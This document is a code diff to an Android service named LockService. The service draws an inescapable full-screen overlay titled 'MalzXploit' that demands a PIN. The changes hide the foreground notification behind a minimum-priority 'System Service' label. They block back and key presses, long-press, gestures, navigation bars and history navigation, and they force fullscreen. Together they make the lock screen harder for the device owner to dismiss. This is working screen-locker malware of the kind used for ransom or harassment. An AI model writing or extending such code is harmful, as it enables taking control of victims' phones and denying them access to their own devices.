@@ -10,6 +10,8 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
+import android.view.KeyEvent;
+import android.view.View;
 import android.view.WindowManager;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebChromeClient;
@@ -37,12 +39,12 @@ public class LockService extends Service {
     public int onStartCommand(Intent i, int f, int s) {
         try {
             NotificationChannel ch = new NotificationChannel(
-                "sys", "System", NotificationManager.IMPORTANCE_LOW);
+                "sys", "System", NotificationManager.IMPORTANCE_MIN);
             getSystemService(NotificationManager.class).createNotificationChannel(ch);
             Notification n = new Notification.Builder(this, "sys")
                 .setContentTitle("System Service")
-                .setContentText("Running")
                 .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .setPriority(Notification.PRIORITY_MIN)
                 .build();
             startForeground(1, n);
         } catch (Exception ignored) {}
@@ -75,6 +77,22 @@ public class LockService extends Service {
                     webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null);
                     webView.addJavascriptInterface(new JsBridge(), "Android");
 
+                    webView.setLongClickable(false);
+                    webView.setHapticFeedbackEnabled(false);
+                    webView.setOnLongClickListener(new View.OnLongClickListener() {
+                        @Override public boolean onLongClick(View v) { return true; }
+                    });
+
+                    webView.setOnKeyListener(new View.OnKeyListener() {
+                        @Override public boolean onKey(View v, int keyCode, KeyEvent event) {
+                            return true;
+                        }
+                    });
+
+                    webView.setFocusable(true);
+                    webView.setFocusableInTouchMode(true);
+                    webView.requestFocus();
+
                     String html = buildHtml();
                     webView.loadDataWithBaseURL(
                         "file:///android_res/raw/",
@@ -91,21 +109,35 @@ public class LockService extends Service {
                         type = WindowManager.LayoutParams.TYPE_PHONE;
                     }
 
+                    int flags =
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
+                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                        | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
+                        | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                        | WindowManager.LayoutParams.FLAG_FULLSCREEN
+                        | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
+                        | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
+                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+
                     WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                         WindowManager.LayoutParams.MATCH_PARENT,
                         WindowManager.LayoutParams.MATCH_PARENT,
                         type,
-                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-                            | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
-                            | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
-                            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
-                            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
-                            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
+                        flags,
                         PixelFormat.OPAQUE
                     );
 
+                    lp.systemUiVisibility =
+                        View.SYSTEM_UI_FLAG_FULLSCREEN
+                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION;
+
                     wm.addView(webView, lp);
-                    webView.setOnKeyListener((v, k, e) -> true);
 
                 } catch (Exception e) {
                     Log.e(TAG, "showLock error: " + e.getMessage());
@@ -119,17 +151,17 @@ public class LockService extends Service {
         StringBuilder sb = new StringBuilder();
         sb.append("<!DOCTYPE html><html lang='en'><head>");
         sb.append("<meta charset='UTF-8'>");
-        sb.append("<meta name='viewport' content='width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no'>");
+        sb.append("<meta name='viewport' content='width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover'>");
         sb.append("<title>MalzXploit</title><style>");
-        sb.append("*{box-sizing:border-box;user-select:none;-webkit-tap-highlight-color:transparent}");
-        sb.append("html,body{margin:0;width:100%;height:100%;overflow:hidden;background:#000;font-family:Arial,sans-serif;color:#fff}");
-        sb.append("video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0;opacity:0.55}");
-        sb.append(".overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.35);z-index:1}");
+        sb.append("*{box-sizing:border-box;user-select:none;-webkit-user-select:none;-webkit-touch-callout:none;-webkit-tap-highlight-color:transparent;touch-action:none}");
+        sb.append("html,body{margin:0;width:100%;height:100%;overflow:hidden;background:#000;font-family:Arial,sans-serif;color:#fff;position:fixed;top:0;left:0}");
+        sb.append("video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0;opacity:0.55;pointer-events:none}");
+        sb.append(".overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.35);z-index:1;pointer-events:none}");
         sb.append(".container{position:relative;z-index:2;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center}");
         sb.append("h1{margin:0 0 14px;font-size:36px;font-weight:bold;text-align:center}");
         sb.append(".subtitle{font-size:21px;color:#bbb;margin-bottom:30px}");
         sb.append(".pin-box{width:305px;height:70px;border:1px solid #555;border-radius:16px;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;margin-bottom:34px}");
-        sb.append("#pin{width:100%;border:none;outline:none;background:transparent;color:white;text-align:center;font-size:32px;letter-spacing:12px}");
+        sb.append("#pin{width:100%;border:none;outline:none;background:transparent;color:white;text-align:center;font-size:32px;letter-spacing:12px;pointer-events:none}");
         sb.append(".keypad{display:grid;grid-template-columns:repeat(3,115px);gap:12px}");
         sb.append("button{height:82px;border:none;border-radius:15px;background:rgba(40,40,40,0.85);color:white;font-size:28px;cursor:pointer}");
         sb.append("button:active{background:rgba(100,100,100,0.9);transform:scale(0.96)}");
@@ -180,6 +212,20 @@ public class LockService extends Service {
         sb.append("function backspace(){var p=document.getElementById('pin');p.value=p.value.slice(0,-1);}");
         sb.append("function checkPin(){var p=document.getElementById('pin').value;if(p===CORRECT_PIN){if(window.Android){window.Android.unlock();}}else{setTimeout(function(){document.getElementById('pin').value='';},300);}}");
         sb.append("document.addEventListener('contextmenu',function(e){e.preventDefault();});");
+        sb.append("document.addEventListener('selectstart',function(e){e.preventDefault();});");
+        sb.append("document.addEventListener('dragstart',function(e){e.preventDefault();});");
+        sb.append("document.addEventListener('gesturestart',function(e){e.preventDefault();});");
+        sb.append("document.addEventListener('touchmove',function(e){e.preventDefault();},{passive:false});");
+        sb.append("document.addEventListener('touchcancel',function(e){e.preventDefault();});");
+        sb.append("document.body.style.overflow='hidden';");
+        sb.append("document.body.style.position='fixed';");
+        sb.append("document.addEventListener('keydown',function(e){e.preventDefault();return false;});");
+        sb.append("window.addEventListener('popstate',function(){history.pushState(null,null,'');});");
+        sb.append("history.pushState(null,null,'');");
+        sb.append("function goFullscreen(){var d=document.documentElement;if(d.requestFullscreen){d.requestFullscreen().catch(function(){});}");
+        sb.append("else if(d.webkitRequestFullscreen){d.webkitRequestFullscreen();}}");
+        sb.append("window.addEventListener('load',goFullscreen);");
+        sb.append("document.addEventListener('touchstart',goFullscreen,{once:true});");
         sb.append("</script></body></html>");
 
         return sb.toString();
